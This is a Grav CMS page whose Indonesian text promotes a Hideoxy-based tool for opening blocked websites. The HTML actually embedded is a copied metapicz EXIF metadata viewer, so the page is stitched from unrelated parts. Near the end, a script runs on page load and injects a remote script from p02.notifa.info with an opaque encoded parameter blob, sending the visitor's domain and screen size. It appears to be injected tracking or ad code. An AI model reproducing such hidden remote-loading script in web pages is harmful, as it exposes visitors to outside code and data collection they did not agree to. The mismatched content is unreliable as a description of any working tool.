---
title: Tools
media_order: website-blocked.png
published: true
date: '23-06-2019 23:33'
taxonomy:
    category:
        - Tool
    tag:
        - 'Unblock Website'
hide_page_title: false
show_sidebar: false
hide_git_sync_repo_link: false
body_classes: 'header-animated header-dark header-transparent'
---

[center]**Buka Website Yang Diblokir**[/center]
[center]Tool ini dibuat berdasarkan Hideoxy. Hideoxy adalah proxy web gratis baru untuk menjelajahi internet secara anonim. Alat ini dapat menyembunyikan alamat IP Anda, mengamankan koneksi Internet Anda, menelusuri situs web secara anonim, menyembunyikan riwayat Internet Anda dan melindungi privasi Anda secara online. Anda dapat menggunakan proksi web Hideoxy di rumah dan di kantor untuk mengunjungi situs web yang diblokir, seperti YouTube, Reddit, Facebook, Google, Tumblr, dan banyak lagi. Jika Anda merasa perlu untuk mengunjungi Hideoxy, gunakan [tautan ini](http://www.hideoxy.com)[/center]

<div>
<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <title>online metadata and exif viewer</title>
  <meta name="description" content="Visualize image metadata anywhere">
  <meta name="viewport" content="width=device-width">
  <link rel="shortcut icon" href="http://metapicz.com/images/metapicz-favicon.ico">
  <link rel="stylesheet" href="http://metapicz.com/css/bootstrap.css">
  <!--<link rel="stylesheet" type="text/css" href="http://fonts.googleapis.com/css?family=Lobster|Merriweather">-->
  <link href="http://fonts.googleapis.com/css?family=Open+Sans:800italic,800" rel="stylesheet" type="text/css">
  <script src="http://metapicz.com/js/libs/modernizr-2.0.6.min.js"></script>
  <script src="http://metapicz.com/js/libs/jquery-1.7.1.min.js"></script>
  <script src="http://metapicz.com/js/jquery.color.js"></script>
  <script src="http://metapicz.com/js/plugins.js"></script>
  <script src="http://metapicz.com/js/script.js"></script>
  <script src="http://maps.google.com/maps/api/js?sensor=false"></script>
  <script src="http://metapicz.com/js/Crypto.js"></script>
  <script src="http://metapicz.com/js/binaryajax.js"></script>
  <script src="http://metapicz.com/js/picapica.js" s=""></script>
</head>

<body>
  <!-- Prompt IE 6 users to install Chrome Frame. Remove this if you support IE 6.
   chromium.org/developers/how-tos/chrome-frame-getting-started -->
  <!--[if lt IE 7 ]><p class=chromeframe>Your browser is <em>ancient!</em> <a href="http://browsehappy.com/">Upgrade to a different browser</a> or <a href="http://www.google.com/chromeframe/?redirect=true">install Google Chrome Frame</a> to experience this site.</p><![endif]-->
  <header>
    <!-- navbar -->
    <div class="title-container">
      <div class="container">
        <div class="title"><a href="" style="color:inherit;text-decoration:none;">metapicz</a></div>
        <!-- <div id="beta-tag"><img src="images/beta-badge.png" width="50" height="50"></div> -->
        <div class="subtitle"></div>
        <!--
            <div class="subtitle">[ view your metadata ]</div>
            <div class="subtitle">[ make links to metadata ]</div>
            <div class="subtitle">[ manage your metadata ]</div>
            <div class="subtitle">[ extract metadata ]</div>
            <div class="subtitle">[ user account ]</div>
            <div class="subtitle">[ view your metadata ]</div>
            <div class="subtitle">[ claim your metadata ]</div>
            -->
      </div>
    </div>
  </header>
  <noscript>
    <!-- hide some stuff when javascript is disabled -->
    <style type="text/css">
      .main-tab {
        display: none !important;
      }
    </style>
    <div class="container">
      <div class="alert alert-error">
        <b style="color:red;">You don't have javascript enabled.</b><br> Metapicz can not work without javascript... sorry :(.
        <!-- <br><br>Here is a hint of what you are missing. -->
      </div>
    </div>
  </noscript>
  <div class="container">
    <div role="main">
      <div id="browser-old" style="display:none"></div>
      <div id="notification-section"></div>
      <div id="landing" class="main-tab">
        <div class="row">
          <div class="span12"></div>
          <p></p>
        </div>
        <!--
        <div class="row">
            <div class="span12">
                <div class="alert alert-success center">
                    Something to prove on the go? Try Securo Mobile for <a href="http://itunes.apple.com/app/securo-mobile-pro/id541525980" target="_blank">iPhone</a> and <a href="https://play.google.com/store/apps/details?id=it.securo.mobile.pro" target="_blank">Android</a>
                </div>
            </div>
        </div>

        <div class="row">
            <div class="span6">
                <div class="alert alert-info">
                    <a href="http://easytimestamping.com/en/" target="_blank">easytimestamping.com protects your intellectual property</a>
                </div>
            </div>

            <div class="span6">
                <div class="alert alert-info">
                    <a href="http://wordpress.org/extend/plugins/view-metadata-on-metapicz/" target="_blank">Integrate metapicz in your blog</a> with our wordpress extension.
                </div>
            </div>
        </div>
        -->
        <div class="row">
          <div class="span12">
            <div id="viewer-dropbox">
              <div id="viewer-dropbox-text" class="center">
                <h2>Drop image files here</h2>
                <a href="javascript: void(0)" style="position:relative; left:150px; font-size: 14px">or select</a>
                <input type="file" id="upload_input" name="upload" onchange="onViewerSelect(this.files)" style="opacity: 0; filter:alpha(opacity: 0);  width: 300px; position: relative; top: 0px; left: -100px">
              </div>
            </div>
          </div>
        </div>
        <div class="row">
          <div class="span12">
            <div id="viewer-url" class="center">
              <label><b>or enter the picture URL</b></label>
              <form class="form-inline">
                <input id="viewer-url-input" type="text" class="span4" placeholder="Insert picture URL">
                <button id="viewer-url-go">GO!</button>
              </form>
            </div>
          </div>
        </div>
        <div id="exif"></div>
      </div> <!-- landing -->
      <div id="linker" class="main-tab">
        <div id="linker-help" class="alert alert-info">
          <p>Here you can create links to the metadata page of the specified image URL. With that link, anybody can see the picture data, the camera info, copyright etc., without installing any plugin, extension or dedicated appplication.</p>
          <p>Use it in your blog or website.</p>
        </div>
        <div id="linker-input">
          <!--Insert image url: <input id="linker-input-url" name="linker-input-url" type="text" onkeypress="onLinkerInputChange(this)" onkeyup="onLinkerInputChange(this)" onkeydown="onLinkerInputChange(this)"/>-->
          <table cellpadding="0">
            <tbody>
              <tr>
                <td class="linker-input-label span4"> Insert image url: </td>
                <td>
                  <div class="linker-input-separator"></div>
                </td>
                <td class="linker-input-url">
                  <input class="span8" id="linker-input-url" name="linker-input-url" type="text" onkeypress="onLinkerInputChange(this)" onkeyup="onLinkerInputChange(this)" onkeydown="onLinkerInputChange(this)">
                </td>
              </tr>
            </tbody>
          </table>
        </div>
        <div class="row">
          <div class="span4">
            <div id="linker-result-newtab-text"></div>
          </div>
          <div class="span8">
            <div id="linker-result-newtab-html" class="well"></div>
          </div>
          <!-- <input class="text" id="linker-result-html" name=""/> -->
        </div>
        <hr>
        <div class="row">
          <div class="span4">
            <div id="linker-result-popup-text"></div>
          </div>
          <div class="span8">
            <div id="linker-result-popup-html" class="well"></div>
          </div>
        </div>
      </div> <!-- linker -->
      <div id="manager" class="main-tab">
        <div id="uimps-nav"></div>
        <div id="uimps-list" class=""></div>
      </div> <!-- manager -->
      <div id="extractor" class="main-tab">
      </div> <!-- extractor -->
      <div id="useraccount" class="main-tab">
        <div class="message-section"></div>
        <div id="account-template">
          <div id="main-account" class="">
            <h2>Username</h2>
            <!-- TODO: User stats -->
          </div>
          <div style="clear:all; height:20px;"></div>
          <div id="identities" class="">
            <h2>Identities</h2>
            <ul id="identities-list">
              <li id="identity-template">Identity 1</li>
            </ul>
            <h2>Linkable identities</h2>
            <ul id="linkable-identities-list">
              <li id="linkable-identity-template"><a class="icon flickr">flickr</a></li>
            </ul>
          </div>
        </div>
      </div> <!-- useraccount -->
      <div id="viewer" class="main-tab">
        <!--<a id="back-to-claimer" href="javascript:void(0)" onclick="">back</a>-->
        <div id="nav-buttons" class="center">
          <button id="back-to-claimer" type="button" name="back" value="back">&lt; back</button>
        </div>
        <div id="exif"></div>
      </div> <!-- viewer -->
      <div id="claimer" class="main-tab">
        <div id="result"></div>
        <div id="drop_it_like_its_hot">
          <h2>Drop image files here</h2>
        </div>
        <!-- <div id="progress_bar"><div class="percent"></div></div> -->
        <div id="claimer-nav"></div>
        <div id="claimer-result" class="">
          <!--
            <div id="imgx" class="thumbnail" >
                <div class="image shadow-out" style="border: 2px solid #FB9500">
                    <img src="" alt="thumb" />
                </div>
            <div class="thumbnail-menu" >actions</div>
            </div>
            -->
        </div>
        <div id="claimer-actions" style="display:none;">
          <button id="claimer-confirm" onclick="javascript:claimerConfirm()"><b>merge metadata</b></button>
          <button type="button" name="clear" value="clear" onclick="location.href=''">clear</button>
        </div>
      </div> <!-- claimer -->
    </div> <!-- end div role="main" -->
  </div> <!-- container -->
  <hr>
  <footer ></footer>
  <!-- Setup google analytics for production environment -->
  <!-- Asynchronous Google Analytics snippet. Change UA-XXXXX-X to be your site's ID.
         mathiasbynens.be/notes/async-analytics-snippet -->
  <script>
    var _gaq = [
      ['_setAccount', 'UA-25251197-1'],
      ['_trackPageview']
    ];
    (function(d, t) {
      var g = d.createElement(t),
        s = d.getElementsByTagName(t)[0];
      g.src = ('https:' == location.protocol ? '//ssl' : '//www') + '.google-analytics.com/ga.js';
      s.parentNode.insertBefore(g, s)
    }(document, 'script'));
  </script>
  <script>
    $(document).ready(function() {
      console.log('ready!')
      /*
      if( location.hash === '#landing' ) {
          $("#notification").text("Welcome to picapica").fadeIn( function() {
              var notification = $(this);
              setTimeout(function() {
                  notification.text = "";
                  notification.fadeOut()
              }, 4000);
          });
      }
      */
      hasher.authenticated = false;
      if (hasher.authenticated) {
        console.log('user IS authenticated:')
        // Surprisingly, even if hasher.authenticated == true the 'user' session variable could still be undefined... but it does not seem to create trouble.
        hasher.user = null;
        console.log(hasher.user);
      }
      picapicaInit();
      if (hasher.authenticated && ['', '#', '#landing'].indexOf(location.hash) != -1) {
        location.hash = '#timestamper';
      } else if (['', '#'].indexOf(location.hash) != -1) {
        location.hash = '#landing';
      }
      $(window).trigger('hashchange');
    });
  </script>
  <script type="text/javascript">
    if (self == top) {
      function netbro_cache_analytics(fn, callback) {
        setTimeout(function() {
          fn();
          callback();
        }, 0);
      }

      function sync(fn) {
        fn();
      }

      function requestCfs() {
        var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
        var idc_glo_r = Math.floor(Math.random() * 99999999999);
        var url = idc_glo_url + "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2fXn8QTqtmQtvBZER4aQGobRQjowHmW9tFOEesA5VwnhxWKzEcMcf8bQ8oZoXj0sMATpAE67jBik%2boBQv0Ww9ServCihh8ADqtaV02kYePSIfh8aTc28ex%2bNOVmzQLe0jLovdRmwfgBU%2bLWV726jIXtBKoxCEdSnNwFuz2Ya2CNjyHQBENzchVkTbWJKc48CPvyaEmAEdBkD6aWRyCSc3TW%2btL2gdmzafWkoG7o6w%2fgBlWVRVxCN2kWYrGz8RMcRWJYLNWfVv7YxbqqZ90UfWKOYFpM%2b1Q72ZuXpwhzbrHuJzA1MSdGX5R7sDYFcFbh81qSN4wvYIO6M%2bjdfrdGD%2fOEJ7AesmLP8IwErgunLCC%2fyYtMKmk5l9LJVDOhP33OG%2bt8FSKNtsVOXq8cX6Uib24M05dj%2fzIKBz75NfYdBKFSEMVS60F2wfqC64Y%2b9YrRx2mfnz0yejAX3LAEuRee7TtsZO1ph6d%2fBcjbtO4dECcj%2fUJeAebyiRBXOaMfwVUC1JKwCa14PSqE%2fIGm6UYAJI2KfFuIt4VRl0" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
        var bsa = document.createElement('script');
        bsa.type = 'text/javascript';
        bsa.async = true;
        bsa.src = url;
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
      }
      netbro_cache_analytics(requestCfs, function() {});
    };
  </script>
  <!-- vim:set et: -->
</body>

</html>
</div>